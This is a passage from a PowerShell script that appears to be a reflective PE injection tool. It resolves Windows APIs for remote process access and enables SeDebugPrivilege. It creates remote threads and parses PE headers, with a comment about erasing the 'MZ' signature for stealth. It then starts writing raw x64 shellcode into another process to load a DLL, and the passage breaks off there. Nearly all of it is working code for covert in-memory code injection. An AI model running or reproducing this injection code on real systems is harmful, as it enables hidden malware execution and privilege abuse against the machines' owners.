		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
